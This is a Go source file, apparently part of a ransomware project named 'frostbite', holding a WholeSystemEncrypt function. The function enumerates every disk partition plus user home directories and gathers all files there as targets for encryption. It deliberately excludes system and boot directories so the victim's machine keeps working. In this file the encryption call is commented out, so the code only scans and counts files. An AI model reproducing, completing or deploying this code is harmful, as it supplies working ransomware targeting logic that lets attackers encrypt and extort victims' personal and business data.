package system

import (
	"fmt"
	"os"
	"runtime"
	"sync"
	"time"

	scan "frostbite.com/tools/scan"
	humanize "github.com/dustin/go-humanize"

	"github.com/shirou/gopsutil/disk"
)

var pl = fmt.Println

// enc "frostbite.com/encryption"

func WholeSystemEncrypt() {

	//set variables
	var (
		filesToEncrypt []string
		// sizeOfFoundFiles int64
	)
	dirsToScan := []string{
		"/home",
		"C:\\Users",
	}
	dirsToRemove := []string{"/", "C:", "C:\\\\", "/boot/efi", "/boot"}

	timeNow := time.Now()
	//get all partitions
	//append all partition mount points to dirsToScan
	//remove dirs that would break the system or do not exist
	dirsToScan = generateListOfDirsToScan(dirsToScan, dirsToRemove)
	pl("dirsToScan: ", dirsToScan)

	//add go routine for each dir
	runtime.GOMAXPROCS(runtime.NumCPU() / 2)
	wg := sync.WaitGroup{}
	wg.Add(len(dirsToScan))

	var chanFilesScanned = make(chan []string)

	for _, dir := range dirsToScan {

		go goroutineScanDir(dir, &wg, chanFilesScanned)

	}
	//listen for channel and append to filesToEncrypt
	go func() {
		for range dirsToScan {
			files := <-chanFilesScanned
			filesToEncrypt = append(filesToEncrypt, files...)
			wg.Done()

		}
	}()

	wg.Wait()

	timeEnd := time.Now()
	pl("\nTOTAL files found: ", humanize.Comma(int64(len(filesToEncrypt))))
	//print human readable size
	pl("Time elapsed: ", timeEnd.Sub(timeNow))

}

func goroutineScanDir(dir string, wg *sync.WaitGroup, chanFilesScanned chan []string) {

	_, err := os.Stat(dir)
	if err != nil {
		if os.IsNotExist(err) {
			fmt.Println("Dir does not exist: ", dir)
			wg.Done()
		}
	} else {
		pl("Scanning: ", dir)
		files, size := scan.ScanNoSideEffects(dir, true)
		//send files to channel
		chanFilesScanned <- files

		pl("Size of found files in: ", dir, " is ", humanize.Bytes(uint64(size)))
	}
}

func generateListOfDirsToScan(dirsToScan []string, dirsToRemove []string) []string {
	partitions, _ := disk.Partitions(false)

	for _, partition := range partitions {
		dirsToScan = append(dirsToScan, partition.Mountpoint)
	}

	dirsToScan = removeDirsFromList(dirsToRemove, dirsToScan)
	return dirsToScan
}

func removeDirsFromList(dirsToRemove []string, dirsToScan []string) []string {
	//* Remove dirs that would break the system

	dirsToReturn := []string{}
	for _, dir := range dirsToScan {
		//check if dir exists and add it to dirsToReturn
		_, err := os.Stat(dir)
		if err == nil {
			dirsToReturn = append(dirsToReturn, dir)

		}

		for _, dirToRemove := range dirsToRemove {
			for i, dir := range dirsToReturn {
				if dir == dirToRemove {
					dirsToReturn = append(dirsToReturn[:i], dirsToReturn[i+1:]...)
				}
			}
		}
	}
	return dirsToReturn
}
